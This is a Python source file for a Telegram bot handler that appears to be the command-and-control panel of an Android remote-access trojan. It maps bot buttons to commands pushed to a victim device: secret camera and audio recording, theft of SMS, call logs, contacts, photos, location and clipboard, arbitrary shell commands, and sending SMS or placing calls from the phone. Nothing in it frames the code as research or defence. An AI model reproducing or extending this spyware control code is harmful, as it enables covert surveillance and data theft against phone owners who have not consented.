# bot_handlers/callbacks/apk_commands.py
from config import bot
from imports_manager import push_apk_command
from logging_config import get_logger

logger = get_logger("bot_handlers.callbacks.apk_commands")


APK_ACTION_MAP = {
    "camera_front": "camera_front",
    "camera_back": "camera_back",
    "camera_record_front": "camera_record_front",
    "camera_record_back": "camera_record_back",
    "record_audio": "record_audio",
    "play_sound": "play_sound",
    "play_alarm": "play_alarm",
    "info": "get_device_info",
    "battery": "get_battery",
    "sms": "get_sms",
    "calls": "get_call_log",
    "contacts": "get_contacts",
    "apps": "get_apps",
    "photos": "get_photos",
    "videos": "get_videos",
    "location": "get_location",
    "wifi": "get_wifi_info",
    "clipboard": "get_clipboard",
    "vibrate": "vibrate",
    "volume_max": "volume_max",
    "lock_screen": "lock_screen",
    "show_home": "show_home",
    "screen_off": "screen_off",
    "media_play": "media_play_pause",
    "media_next": "media_next",
    "media_prev": "media_previous",
    "shell": "shell",
}


def handle(call, chat_id, user_id, data):
    body = data.replace("apk_cmd_", "")
    parts = body.rsplit("_", 1)
    if len(parts) != 2:
        bot.answer_callback_query(call.id, "❌ صيغة خاطئة", show_alert=True)
        return

    action_key, device_id = parts

    # ─── مستوى صوت ───
    if action_key == "volume_mute":
        ok = push_apk_command(device_id, "volume_set", level=0, stream="music")
        bot.answer_callback_query(call.id, "🔉" if ok else "❌", show_alert=not ok)
        return

    if action_key == "volume_mid":
        ok = push_apk_command(device_id, "volume_set", level=8, stream="music")
        bot.answer_callback_query(call.id, "⚡" if ok else "❌", show_alert=not ok)
        return

    # ─── أوامر تفاعلية ───
    if action_key in ("toast", "shell", "send_sms", "call", "open_url"):
        bot.answer_callback_query(call.id)
        prompt_map = {
            "toast": "💬 <b>أرسل النص:</b>",
            "shell": "💻 <b>أرسل الأمر:</b>",
            "send_sms": "✉️ <b>أرسل:</b> <code>رقم|نص</code>",
            "call": "📞 <b>أرسل الرقم:</b>",
            "open_url": "🌐 <b>أرسل الرابط:</b>",
        }
        msg = bot.send_message(chat_id, prompt_map[action_key], parse_mode="HTML")

        from ..steps.apk_steps import (
            apk_toast_step, apk_shell_step, apk_sendsms_step,
            apk_call_step, apk_url_step,
        )
        step_map = {
            "toast": apk_toast_step,
            "shell": apk_shell_step,
            "send_sms": apk_sendsms_step,
            "call": apk_call_step,
            "open_url": apk_url_step,
        }
        step_fn = step_map[action_key]
        bot.register_next_step_handler(msg, lambda m: step_fn(m, device_id))
        return

    # ─── الأوامر العادية ───
    if action_key in APK_ACTION_MAP:
        real_action = APK_ACTION_MAP[action_key]
        kwargs = {}
        if "camera_record" in action_key:
            kwargs["duration"] = 10000
        elif action_key == "record_audio":
            kwargs["duration"] = 10000
        elif action_key == "vibrate":
            kwargs["ms"] = 3000

        ok = push_apk_command(device_id, real_action, **kwargs)
        bot.answer_callback_query(call.id, "✅" if ok else "❌", show_alert=not ok)
        return

    bot.answer_callback_query(call.id, f"❓ {action_key}", show_alert=True)
